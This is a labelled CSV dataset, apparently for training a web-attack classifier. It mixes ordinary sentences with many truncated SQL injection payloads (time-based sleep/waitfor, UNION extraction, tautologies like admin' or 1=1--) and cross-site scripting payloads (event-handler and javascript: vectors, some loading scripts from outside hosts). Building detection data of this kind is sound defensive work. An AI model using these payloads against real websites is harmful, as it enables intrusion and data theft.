Payload,Label,text_label,ID
"""I do not accept the select committee and I will n",0,normal,26460
"-8557 or 1 group by concat ( 0x7171706a71, ( selec",2,SQLi,18711
ORDER BY 1#,2,SQLi,10274
<strike id=x tabindex=1 ondeactivate=alert(1)></st,1,XSS,5058
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10803
Container Store: Kitchen & Pantry sale: Save 25% o,0,normal,26268
<IMG SRC=ï¿½javascript:alert(ï¿½XSSï¿½)ï¿½,1,XSS,1729
"-6809"" ) ) or 5903 = ( 'qqpjq'|| ( select case 590",2,SQLi,16997
1'+ ( select 'phtz' where 3171 = 3171,2,SQLi,16012
<svg><mark onload=alert(1)></mark>,1,XSS,4669
"1%' ) ) union all select null,null,null,null,null,",2,SQLi,21800
"<audio onbeforecopy=""alert(1)"" contenteditable>tes",1,XSS,8538
"<abbr draggable=""true"" ondragleave=""alert(1)"">test",1,XSS,3753
"1"" ) ) ) procedure analyse ( extractvalue ( 9255,c",2,SQLi,12927
1' ) where 6244 = 6244 rlike ( select * from ( sel,2,SQLi,12725
select * from users where id = '1' or $ 1 = 1 unio,2,SQLi,11410
<audio autoplay controls onseeked=alert(1)><source,1,XSS,98
Specify conditions where useful.,0,normal,23372
"<thead onkeyup=""alert(1)"" contenteditable>test</th",1,XSS,3140
"iif ( 3760 = 4785,1,1/0 )",2,SQLi,13371
1'+ ( select inrv where 2178 = 2178 or 7417 = ( se,2,SQLi,14360
"-9959"" ) where 7073 = 7073 union all select 7073,7",2,SQLi,17924
-9145' ) or 5903 = ( 'qqpjq'|| ( select case 5903 ,2,SQLi,13143
1'|| ( select 'txyy' where 6500 = 6500 procedure a,2,SQLi,15180
"<IMG """"""><SCRIPT>alert("""")</SCRIPT>""\>",1,XSS,3651
))%20waitfor%20delay%20'0:0:20'%20--,2,SQLi,10852
Select product.,0,normal,24553
"-3955 where 7276 = 7276 union all select 7276,7276",2,SQLi,17904
<;IMG RC=&;#106;&;#97;&;#118;&;#97;&;#115;&;#99;&;,1,XSS,1635
"1 where 6383 = 6383 or elt ( 6272 = 6272,sleep ( 5",2,SQLi,21011
1 ) as ghew where 6441 = 6441 union all select nul,2,SQLi,12467
"select * from users where id = 1 or 1#"" ( union se",2,SQLi,11864
Update your email signature with flair.,0,normal,22953
"{""id"":null,""firstName"":""Chan"",""lastName"":""Sung"",""s",0,normal,27260
1%' and ( select * from ( select ( sleep ( 5 ) ) ),2,SQLi,18477
Where's the treasure?,0,normal,23484
<ol id=x tabindex=1 onactivate=alert(1)></ol>,1,XSS,6174
<h1 onpointerleave=alert(1)>XSS</h1>,1,XSS,7524
`'><script>-javascript:alert(1)</script>,1,XSS,573
or ''&',2,SQLi,9882
As Jennings and Wlezien put it: [I]n presidential ,0,normal,26349
"1"" where 5062 = 5062",2,SQLi,19449
/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:,1,XSS,598
"1"" ) ) as azak where 4911 = 4911",2,SQLi,15355
Join fitness.,0,normal,23020
Please select wisely.,0,normal,24262
<style>@keyframes slidein {}</style><object style=,1,XSS,7348
"<blockquote onbeforecopy=""alert(1)"" contenteditabl",1,XSS,6307
"{""id"":null,""name"":""Bronzor""}",0,normal,26861
"-4427' ) ) union all select 6357,6357,6357,6357,63",2,SQLi,16379
Select your trip.,0,normal,25020
1%' ) ) ( select ( case when ( 5451 = 5451 ) then ,2,SQLi,22363
"-7678 ) ) ) union all select 2622,2622,2622,2622,2",2,SQLi,18325
"<article draggable=""true"" ondrag=""alert(1)"">test</",1,XSS,1755
"1 ) procedure analyse ( extractvalue ( 5840,concat",2,SQLi,20057
Select the dessert.,0,normal,24819
1 where 1568 = 1568 or ( select * from ( select ( ,2,SQLi,18748
"1"" and 4386 = utl_inaddr.get_host_address ( chr ( ",2,SQLi,20647
"<output onkeyup=""alert(1)"" contenteditable>test</o",1,XSS,5435
Merge the data tables.,0,normal,22672
1'+ ( select trte where 9173 = 9173 and 2006 = 200,2,SQLi,13186
Select load.,0,normal,24592
"{""id"":null,""name"":""Samurott""}",0,normal,26892
admin' ) or ( '1' = '1'#,2,SQLi,11932
Select spoon.,0,normal,24528
Select the language you want to use for closed cap,0,normal,25592
"<div id=""61""><div style=""\63&#9\06f&#10\0006c&#12\",1,XSS,9138
It remains $9 and is only available on select flig,0,normal,25955
"1%"" ) ) and 3580 = ( select count ( * ) from domai",2,SQLi,21978
"<IMG SRC=x onbeforeprint=""alert(String.fromCharCod",1,XSS,1173
"1' and make_set ( 8403 = 8403,8899 ) and 'niux' = ",2,SQLi,15565
"<style>@keyframes x{}</style><rp style=""animation-",1,XSS,7930
select,0,normal,26618
gone case select hello please,0,normal,26135
"{""id"":null,""name"":""Nurse Shark""}",0,normal,27011
Select your symbol.,0,normal,24897
"1"" ) ) as ihfw where 3949 = 3949 and 8312 = dbms_p",2,SQLi,14534
1' ) ) ) or sleep ( 5 ) and ( ( ( 'ecur' = 'ecur,2,SQLi,15895
""" Sandeep demonstrated that these numbers can be u",0,normal,26473
1' where 9242 = 9242,2,SQLi,17261
"1' ) ) and 4241 = convert ( int, ( select char ( 1",2,SQLi,18684
1,0,normal,26671
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,2645
<tt onpointerleave=alert(1)>XSS</tt>,1,XSS,5350
"</stylesheet>//[""'`-->]]>]</div>",1,XSS,9035
"1 ) ) ) union all select null,null,null--",2,SQLi,22062
1' ) and 2577 = 7094,2,SQLi,16968
"<a href=""javascript:x='%27-alert(1)-%27';"">XSS</a>",1,XSS,205
<button autofocus onfocusin=alert(1)>test</button>,1,XSS,7899
}alert(/INJECTX/);{//,1,XSS,9836
"<style>@keyframes x{}</style><main style=""animatio",1,XSS,2016
"1"" ) as obbk where 6414 = 6414 and ( select 9067 f",2,SQLi,17292
"1"" ) ) as eqeb where 6784 = 6784 and updatexml ( 3",2,SQLi,17018
<form onpointerup=alert(1)>XSS</form>,1,XSS,8464
"select count ( * ) from domain.domains as t1,domai",2,SQLi,19678
"<data draggable=""true"" ondragenter=""alert(1)"">test",1,XSS,1976
"<a href=""javascript://%0aalert(1)"">XSS</a>",1,XSS,163
"<button onmouseover=""alert(1)"">test</button>",1,XSS,5001
"While you're still online, select the book you wan",0,normal,25128
""">><marquee><img src=x onerror=confirm(1)></marque",1,XSS,9560
"<style>@keyframes x{}</style><head style=""animatio",1,XSS,4716
"<a xmlns:xlink=""http://www.w3.org/1999/xlink"" xlin",1,XSS,9070
\&quot;;alert(&apos;XSS&apos;);//,1,XSS,1433
"-5278"" ) ) ) union all select 5264,5264,5264#",2,SQLi,15264
Index columns where required.,0,normal,23255
1'|| ( select 'ymez' from dual where 9870 = 9870 o,2,SQLi,12838
-3044' ) or 4999 = 3051#,2,SQLi,13978
"{""id"":null,""name"":""Honchkrow""}",0,normal,26875
"<thead onmouseleave=""alert(1)"">test</thead>",1,XSS,7713
"<picture ondblclick=""alert(1)"">test</picture>",1,XSS,7739
"<dl onbeforecut=""alert(1)"" contenteditable>test</d",1,XSS,4286
"<SCRIPT/ SRC=""http://.rocks/.js""></SCRIPT>",1,XSS,7534
"1%' ) or 6979 = like ( 'abcdefg',upper ( hex ( ran",2,SQLi,14142
"1"" where 1852 = 1852 union all select null,null,nu",2,SQLi,17072
"1%' ) ) union all select null,null#",2,SQLi,13496
1 or 1=1,2,SQLi,10056
"""))%20waitfor%20delay%20'0:0:20'%20--",2,SQLi,10854
<rtc id=x tabindex=1 onactivate=alert(1)></rtc>,1,XSS,3387
<svg><noframes onload=alert(1)></noframes>,1,XSS,2841
Select your pledge.,0,normal,24952
To purchase an item select the Add To Shopping Bas,0,normal,25260
I'm thinking of where to take a cooking class.,0,normal,23849
"1%"" ) ) union all select null,null,null,null,null,",2,SQLi,15081
"1"" ) ) and ( 3020 = 3020 ) *6703 and ( ( ""njdx"" li",2,SQLi,19718
"select count ( * ) from domain.domains as t1,domai",2,SQLi,15944
"UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1",2,SQLi,10598
Create a mural.,0,normal,22791
1 ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ,2,SQLi,15436
<rt id=x tabindex=1 onbeforeactivate=alert(1)></rt,1,XSS,2098
"<>""'%;)(&+",2,SQLi,10198
The XLE is the Energy Select Sector SPDR Fund ETF.,0,normal,25355
<p onblur=alert(1) tabindex=1 id=x></p><input auto,1,XSS,8002
Save up to 25% off select Grills and Pool Supplies,0,normal,25725
"<frame onmouseout=""alert(1)"">test</frame>",1,XSS,5020
"1"" ) ) ) and sleep ( 5 ) and ( ( ( ""bvgg"" = ""bvgg",2,SQLi,17836
Index columns where applicable.,0,normal,23287
1' ) ) ) and ( select * from ( select ( sleep ( 5 ,2,SQLi,18997
"1"" waitfor delay '0:0:5'",2,SQLi,18287
select ( case when ( 1407 = 2741 ) then 1407 else ,2,SQLi,20307
"<area draggable=""true"" ondragenter=""alert(1)"">test",1,XSS,2759
<style>:target {color:red;}</style><content id=x s,1,XSS,6400
")) or benchmark(10000000,MD5(1))#",2,SQLi,10080
1' ) ) rlike ( select * from ( select ( sleep ( 5 ,2,SQLi,13933
"Rabi` to select Ali, knowing that the dislike felt",0,normal,25759
"-1597"" where 5933 = 5933 or 3038 = 3038",2,SQLi,14085
<main id=x tabindex=1 onbeforedeactivate=alert(1)>,1,XSS,2099
<canvas onfocusout=alert(1) tabindex=1 id=x></canv,1,XSS,8332
"-8487' ) where 9655 = 9655 union all select 9655,9",2,SQLi,22011
"</html>//[""'`-->]]>]</div>",1,XSS,9031
<animatetransform onpointerdown=alert(1)>XSS</anim,1,XSS,3474
1 where 1299 = 1299,2,SQLi,12892
1' or 5286 = ( select count ( * ) from all_users t,2,SQLi,14475
call regexp_substring ( repeat ( right ( char ( 37,2,SQLi,16233
"-6184"" ) ) or 2724 in ( ( char ( 113 ) +char ( 113",2,SQLi,18558
"1"" ) ) ) union all select null,null#",2,SQLi,18512
%22/%3E%3CBODY%20onload='document.write(%22%3Cs%22,1,XSS,1735
select ( case when ( 2294 = 3651 ) then 2294 else ,2,SQLi,18397
"{""id"":null,""name"":""coffee""}",0,normal,27334
"<IMG SRC=\""jav&#x09;ascript:alert('XSS');\"">",1,XSS,1285
select sleep ( 5 ) and ( ( 'mmvf' like 'mmvf,2,SQLi,12488
1' ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( ,2,SQLi,12451
select * from master..sysserverse,2,SQLi,10031
"-5830 ) or 1570 = convert ( int, ( select char ( 1",2,SQLi,21624
"d=\""alert('XSS');\\"")\"";",1,XSS,1020
"1' in boolean mode ) union all select null,null,nu",2,SQLi,16187
The automaker announced today a feature that will ,0,normal,25484
"javascript:/*`/*'/*'/*""-/*\""/**/ alert()//></title",1,XSS,9521
"1"" ) and sleep ( 5 ) #",2,SQLi,19197
"1"" ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) ",2,SQLi,17523
<;SCRIPT SRC=http://ha.ckers.org/xss.js,1,XSS,1653
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""h",1,XSS,831
"<IMG SRC=x onload=""alert(String.fromCharCode(88,83",1,XSS,1171
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHA",2,SQLi,10723
<rb onpointerover=alert(1)>XSS</rb>,1,XSS,6259
"<element onkeypress=""alert(1)"" contenteditable>tes",1,XSS,5472
"1"" ) ) ) union all select null,null--",2,SQLi,16047
ORDER BY 19--,2,SQLi,10261
"1"" ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121",2,SQLi,16066
"-2230%"" union all select 3303,3303,3303--",2,SQLi,17254
or SLEEP(5)=,2,SQLi,11169
"{""id"":null,""name"":""Jynx""}",0,normal,26829
"<kbd ondblclick=""alert(1)"">test</kbd>",1,XSS,5096
1'|| ( select 'zdfo' from dual where 4288 = 4288 u,2,SQLi,21820
"<a href=""javascript\x3A:javascript:alert(1)"" id=""f",1,XSS,542
<video onloadstart=alert(1)><source>,1,XSS,9327
select ( case when ( 9746 = 8055 ) then 9746 else ,2,SQLi,17050
"1%"" ) ) ) and 3707 = ( select count ( * ) from sys",2,SQLi,12696
Plant some aromatic herbs.,0,normal,22741
1,0,normal,26717
"<bgsound ondblclick=""alert(1)"">test</bgsound>",1,XSS,3393
""" or sleep ( __TIME__ ) = """,2,SQLi,12083
1 and sleep 5,2,SQLi,11157
1'|| ( select 'zccb' from dual where 8911 = 8911,2,SQLi,14229
"1"" ) ) or 9643 = ( select count ( * ) from domain.",2,SQLi,16980
"-8425"" ) ) or ( 6485 = 1127 ) *1127 and ( ( ""qruf""",2,SQLi,16032
"{""id"":null,""firstName"":""Sing Huat"",""lastName"":""Ong",0,normal,27529
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5--",2,SQLi,10778
"""+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NUL",2,SQLi,11008
<center id=x tabindex=1 onfocus=alert(1)></center>,1,XSS,3962
<style>:target {color:red;}</style><shadow id=x st,1,XSS,6646
coerce,0,normal,23228
"1 ) ) procedure analyse ( extractvalue ( 5840,conc",2,SQLi,20818
1' ) ) ) or 8315 = ( select count ( * ) from sysib,2,SQLi,16103
"1 ) ) union all select null,null,null,null,null--",2,SQLi,16090
"<input onbeforecopy=alert(1) value=""XSS"" autofocus",1,XSS,3589
Select your outcome.,0,normal,24878
<nav onpointerdown=alert(1)>XSS</nav>,1,XSS,2565
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10825
Select sign.,0,normal,24632
"<form draggable=""true"" ondrag=""alert(1)"">test</for",1,XSS,5039
\x3c,1,XSS,1082
<mark id=x tabindex=1 onactivate=alert(1)></mark>,1,XSS,5894
"1"" ) and elt ( 6651 = 1172,1172 ) and ( ""zfkb"" lik",2,SQLi,14540
select ( case when ( 4769 = 4769 ) then 4769 else ,2,SQLi,21353
"<html onbeforecut=""alert(1)"" contenteditable>test<",1,XSS,2025
select ( case when ( 4624 = 4844 ) then 4624 else ,2,SQLi,13112
During the second period of his service in Congres,0,normal,26222
<main onpointerup=alert(1)>XSS</main>,1,XSS,7912
Mr. Trump has yet to select nominees for the vacan,0,normal,25874
I need to select the right book for my reading lis,0,normal,23708
"1"" ) ) as dcrk where 5164 = 5164 and 2716 = ( sele",2,SQLi,16613
&lt;!&#91;endif&#93;--&gt;,1,XSS,1014
"1"" where 3247 = 3247 or 1022 = ( select count ( * ",2,SQLi,14874
-6200' ) ) as jjpz where 4490 = 4490 union all sel,2,SQLi,18316
"<object data=""http://corkami.googlecode.com/svn/!s",1,XSS,9238
"<bdi oncopy=""alert(1)"" contenteditable>test</bdi>",1,XSS,5254
<button onDataSetChanged=javascript:alert(1)>,1,XSS,9599
"<svg onbeforecopy=""alert(1)"" contenteditable>test<",1,XSS,2181
1' and 8407 = ( select count ( * ) from generate_s,2,SQLi,17084
"1' ) or 8384 = like ( 'abcdefg',upper ( hex ( rand",2,SQLi,17511
Where's the perfect spot to watch the sunrise?,0,normal,23765
1 ) as boed where 6787 = 6787,2,SQLi,12090
1 ) ) as qlkf where 6635 = 6635,2,SQLi,21576
<u onpointerover=alert(1)>XSS</u>,1,XSS,5113
Select the correct answer.,0,normal,24289
"<image onclick=""alert(1)"">test</image>",1,XSS,1780
Select help.,0,normal,24738
-4896' ) union all select 1929--,2,SQLi,19021
1' ) ) ) and 3754 = ( select upper ( xmltype ( chr,2,SQLi,15382
Let's explore where the hiking trail ends.,0,normal,23931
"<br onmouseout=""alert(1)"">test</br>",1,XSS,7607
1'+ ( select 'xbyn' where 6881 = 6881,2,SQLi,19876
-8234' ) ) ) or 9323 = 9323#,2,SQLi,13947
1'|| ( select 'hshf' where 9073 = 9073 and 7533 = ,2,SQLi,17424
Select your slide.,0,normal,25022
"{""id"":null,""firstName"":""Eevee"",""lastName"":""Yeo"",""s",0,normal,27537
"1' where 3760 = 3760 union all select null,null,nu",2,SQLi,19036
"ORDER BY 1,SLEEP(5)--",2,SQLi,10476
"1"" ) ) as ynuw where 9138 = 9138",2,SQLi,14936
"1', ( select ( case when ( 7616 = 7616 ) then 1 el",2,SQLi,19366
"-5245' or elt ( 1032 = 1032,3623 ) and 'qfvo' = 'q",2,SQLi,18934
"<br onkeydown=""alert(1)"" contenteditable>test</br>",1,XSS,5135
<em id=x tabindex=1 onbeforedeactivate=alert(1)></,1,XSS,2161
(SELECT pg_sleep(5)),2,SQLi,11332
1' ) ) as hrra where 9533 = 9533 and char ( 111 ) ,2,SQLi,14045
select sleep ( 5 ) and 'eskp' like 'eskp,2,SQLi,14569
"<object onmousemove=""alert(1)"">test</object>",1,XSS,6448
"<tr onmouseout=""alert(1)"">test</tr>",1,XSS,3970
&lt;DIV STYLE=&quot;background-image:\0075\0072\00,1,XSS,1430
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,3083
"<wbr onmouseout=""alert(1)"">test</wbr>",1,XSS,2522
"select * from users where id = 1 or 1#"", union sel",2,SQLi,11757
Select dessert first.,0,normal,24420
"union (select NULL, NULL, (select @@version)) --",2,SQLi,10050
Save up to 55% off select Muscle Tech Sports Nutri,0,normal,25709
"Olsen, who joined M&G in April 2014, will remain m",0,normal,25853
<picture onpointerout=alert(1)>XSS</picture>,1,XSS,6022
1%' ) and ( 3020 = 3020 ) *6703 and ( '%' = ',2,SQLi,16835
1%' ) ) ) and 8635 = ( select count ( * ) from gen,2,SQLi,16901
"1, ( select ( case when ( 5334 = 4976 ) then 1 els",2,SQLi,22382
Update the social media status.,0,normal,22659
<discard onpointerdown=alert(1)>XSS</discard>,1,XSS,3730
Where can I select a gift for my nephew?,0,normal,23740
"<th onkeydown=""alert(1)"" contenteditable>test</th>",1,XSS,8556
Insert the USB cable.,0,normal,22666
"From the menu that comes up, select the option ' D",0,normal,26157
I want to select a book to read during my vacation,0,normal,23682
"javascript:`</template>\""///""//</script/--></title",1,XSS,9499
"<optgroup onmouseleave=""alert(1)"">test</optgroup>",1,XSS,6254
<select onpointerout=alert(1)>XSS</select>,1,XSS,5929
1' in boolean mode ) or 2367 = ( select count ( * ,2,SQLi,18847
1' ) ) as babx where 2494 = 2494 or 1022 = ( selec,2,SQLi,16409
call regexp_substring ( repeat ( left ( crypt_key ,2,SQLi,18453
-8099%' ) ) or 4747 = dbms_utility.sqlid_to_sqlhas,2,SQLi,18040
<i onfocusout=alert(1) tabindex=1 id=x></i><input ,1,XSS,8897
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,8709
&lt;DIV STYLE=&quot;width: expression(alert(&apos;,1,XSS,1378
<BODY BACKGROUND=ï¿½javascript:alert(ï¿½XSSï¿½)ï¿½>,1,XSS,1726
"<acronym onmouseenter=""alert(1)"">test</acronym>",1,XSS,3757
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,",2,SQLi,10520
1' ) and 8407 = ( select count ( * ) from generate,2,SQLi,20570
"Click ""Select all,"" and then click the icon again ",0,normal,26280
"<strong oncopy=""alert(1)"" contenteditable>test</st",1,XSS,4085
"select * from users where id = 1 or ""_;"" or 1 = 1 ",2,SQLi,11873
The guards force the inmates to select a shawish (,0,normal,25435
Insert the new batteries into the device.,0,normal,22966
"1%"" or char ( 119 ) ||char ( 100 ) ||char ( 99 ) |",2,SQLi,20945
"1"" ) where 2758 = 2758 union all select null,null,",2,SQLi,12503
1%' ) ) ) order by 1#,2,SQLi,13060
"-1634%' union all select 5937,5937,5937,5937--",2,SQLi,19924
1' ) or 2633 = dbms_pipe.receive_message ( chr ( 1,2,SQLi,16143
Where's the SQL script?,0,normal,23390
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3--",2,SQLi,10776
select ( case when ( 1961 = 2048 ) then 1961 else ,2,SQLi,20717
group by userid having 1=1--,2,SQLi,9954
-8966%' or ( 7475 = 4014 ) *4014 and '%' = ',2,SQLi,14574
1' in boolean mode ) and 8514 = ( select count ( *,2,SQLi,17033
Filter junk emails.,0,normal,22768
I'm considering where to take a class.,0,normal,23914
"{""id"":null,""firstName"":""Fook Weng"",""lastName"":""Ow ",0,normal,27205
1' ) ) as vdhw where 8858 = 8858 order by 1#,2,SQLi,14218
-2393%' ) ) union all select 2772--,2,SQLi,16000
<style>:target {transform: rotate(180deg);}</style,1,XSS,7168
Select plot.,0,normal,24747
Select a hairstyle for a fresh look.,0,normal,24084
) AS 1337 WHERE 1337=1337 AND (SELECT 1337 FROM (S,2,SQLi,11185
"{""id"":null,""name"":""cake""}",0,normal,26813
<frame id=x tabindex=1 onactivate=alert(1)></frame,1,XSS,4878
"AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHA",2,SQLi,10739
Select and display the waveform at the circuit inp,0,normal,25646
end and ( 'hmtt' like 'hmtt,2,SQLi,15993
1 ) ) as vycb where 3524 = 3524 and 6414 = ( selec,2,SQLi,21728
1' ) ) as plbt where 4368 = 4368 and 3754 = ( sele,2,SQLi,12261
Where's your SQL origin?,0,normal,23418
"-7802' ) ) ) or elt ( 8778 = 9974,9974 ) and ( ( (",2,SQLi,18547
"<img src onerror /"" '""= alt=javascript:alert(1)//""",1,XSS,686
"select * from users where id = 1 or ""1&"" or 1 = 1 ",2,SQLi,11438
The Financial Select Sector SPDR Fund fell 3 perce,0,normal,25446
-7239' or 5903 = ( 'qqpjq'|| ( select case 5903 wh,2,SQLi,14294
<content onpointerout=alert(1)>XSS</content>,1,XSS,2463
"1"" ) where 7010 = 7010 and 9660 = ( select count (",2,SQLi,12278
"select * from users where id = 1 union select 1 $,",2,SQLi,11892
"<data onmousedown=""alert(1)"">test</data>",1,XSS,7131
1 ) rlike ( select * from ( select ( sleep ( 5 ) ),2,SQLi,16380
Join the virtual meeting.,0,normal,22654
1 ) ) or 9643 = ( select count ( * ) from domain.d,2,SQLi,21328
"<base onbeforepaste=""alert(1)"" contenteditable>tes",1,XSS,5949
<style>:target {color:red;}</style><plaintext id=x,1,XSS,4586
"-3082"" ) where 1082 = 1082 or 5023 = ctxsys.driths",2,SQLi,22171
"-4670"" ) ) or 3038 = 3038",2,SQLi,12235
I'm planning to pick up some new clothes.,0,normal,23956
1 where 3478 = 3478 ( select ( case when ( 4587 = ,2,SQLi,13073
"1,row ( 7937,5067 ) > ( select count ( * ) ,concat",2,SQLi,16908
"{""id"":null,""firstName"":""Jett"",""lastName"":""Salvador",0,normal,27012
"<cite onmouseover=""alert(1)"">test</cite>",1,XSS,3986
"select count ( * ) from domain.domains as t1,domai",2,SQLi,14689
<element onpointerdown=alert(1)>XSS</element>,1,XSS,6306
admin' or 1=1--,2,SQLi,9911
<SCRIPT onreadystatechange=javascript:javascript:a,1,XSS,781
"1 ) union all select null,null,null--",2,SQLi,17156
1 ) where 2307 = 2307,2,SQLi,21994
"<style>@keyframes x{}</style><iframe style=""animat",1,XSS,5981
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) an",2,SQLi,20134
"<tbody onmouseup=""alert(1)"">test</tbody>",1,XSS,2198
1 ) or 9643 = ( select count ( * ) from domain.dom,2,SQLi,14092
"{""id"":null,""firstName"":""Jayden"",""lastName"":""Shen"",",0,normal,27461
1%' ) ) rlike ( select ( case when ( 6094 = 7893 ),2,SQLi,20672
They are often habitual readers and they typically,0,normal,25318
<svg/onload=alert(`INJECTX`)>,1,XSS,9835
"<progress onpaste=""alert(1)"" contenteditable>test<",1,XSS,6982
select case when 6662 = 9889 then 1 else null end-,2,SQLi,18214
"select * from users where id = 1. union select 1,v",2,SQLi,11827
1 ) where 1090 = 1090 and 6240 = ( 'qqpjq'|| ( sel,2,SQLi,19396
<source onpointermove=alert(1)>XSS</source>,1,XSS,2378
"1"" ) as nqtn where 5606 = 5606 and 9660 = ( select",2,SQLi,20226
1' where 9708 = 9708 or sleep ( 5 ) --,2,SQLi,17633
Where's the best place to capture nature's beauty?,0,normal,23891
AND 1 = utl_inaddr.get_host_address ( ( SELECT SYS,2,SQLi,11486
"<select onbeforecopy=""alert(1)"" contenteditable>te",1,XSS,6514
"1%"" ) ) rlike sleep ( 5 ) #",2,SQLi,13282
"""The expansion of PW select mirrors the growth and",0,normal,26453
"1"" where 6347 = 6347 union all select null,null,nu",2,SQLi,14476
"<plaintext onbeforecopy=""alert(1)"" contenteditable",1,XSS,5442
"UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8",2,SQLi,10762
"<th onpaste=""alert(1)"" contenteditable>test</th>",1,XSS,6496
`'><script>\x0Ajavascript:alert(519)</script>,1,XSS,8967
<meter onpointerover=alert(1)>XSS</meter>,1,XSS,5513
"<strike onpaste=""alert(1)"" contenteditable>test</s",1,XSS,5333
Select your proclaim.,0,normal,24958
"<title onmouseover=""alert(1)"">test</title>",1,XSS,4534
"?baseurl=asfunction:getURL,javascript:alert(1)//"",",1,XSS,9869
"-9959"" ) or 4747 = dbms_utility.sqlid_to_sqlhash (",2,SQLi,15590
"1%' and ( select 9067 from ( select count ( * ) ,c",2,SQLi,16752
);waitfor delay '0:0:__TIME__'--,2,SQLi,10145
"1"" where 4281 = 4281",2,SQLi,12092
Join yoga class.,0,normal,22807
"1"" where 4978 = 4978 and 6510 = ( select count ( *",2,SQLi,16534
"-8792 union all select 1246,1246,1246,1246,1246,12",2,SQLi,18055
#ERROR!,2,SQLi,11283
In 18 3 a select committee of the House of Commons,0,normal,26025
Select a scent for your space.,0,normal,24037
"<label onmousedown=""alert(1)"">test</label>",1,XSS,7791
<q id=x tabindex=1 onfocusin=alert(1)></q>,1,XSS,3459
"1"" ) as vzdq where 3160 = 3160",2,SQLi,19658
"<shadow draggable=""true"" ondragend=""alert(1)"">test",1,XSS,4943
"<listener event=""load"" handler=""#y"" xmlns=""http://",1,XSS,9226
Insert your passport details.,0,normal,22617
Help your tween or teen select age-appropriate sou,0,normal,26105
"1"" where 9618 = 9618 and ( 3020 = 3020 ) *6703--",2,SQLi,14919
Let's meet at the cafÃÂ© where we first met.,0,normal,23727
"1"" and ( select 9067 from ( select count ( * ) ,co",2,SQLi,20313
<svg><rt onload=alert(1)></rt>,1,XSS,7102
"<kbd draggable=""true"" ondragleave=""alert(1)"">test<",1,XSS,8083
"1%"" ) ) ) order by 1--",2,SQLi,16465
Join tables where needed.,0,normal,23475
"1"" ) as vcvw where 2445 = 2445 and 8594 = ( select",2,SQLi,18634
"While their inventory consists of newer cards, suc",0,normal,25129
"{""id"":null,""name"":""cotton""}",0,normal,27549
VIDGO will also offer live local stations in selec,0,normal,25185
Let's find out where the nearest gas station is.,0,normal,23838
"1' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ",2,SQLi,18666
Select soda.,0,normal,24510
1' in boolean mode ) ( select ( case when ( 4587 =,2,SQLi,20284
Where's the mansion?,0,normal,23564
<svg%0Aonload=%09((pro\u006dpt))()//,1,XSS,9315
"<div draggable=""true"" contenteditable>drag me</div",1,XSS,6175
<textarea onauxclick=alert(1)>XSS</textarea>,1,XSS,3634
"select count ( * ) from rdb$fields as t1,rdb$types",2,SQLi,16958
"<head oncopy=""alert(1)"" contenteditable>test</head",1,XSS,6275
"<script onLoad script onLoad=""javascript:javascrip",1,XSS,393
<svg><tbody onload=alert(1)></tbody>,1,XSS,3194
<audio src/onerror=alert(1)>,1,XSS,17
1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ,2,SQLi,20587
"1 union all select null,null,null,null--",2,SQLi,19059
"{""id"":null,""name"":""principal possible""}",0,normal,26999
Sort the colored beads.,0,normal,22551
1 ) where 2888 = 2888 or 8156 = ( select count ( *,2,SQLi,19880
"Some may select charitable objectives, and good lu",0,normal,25533
"<q onmouseover=""alert(1)"">test</q>",1,XSS,7397
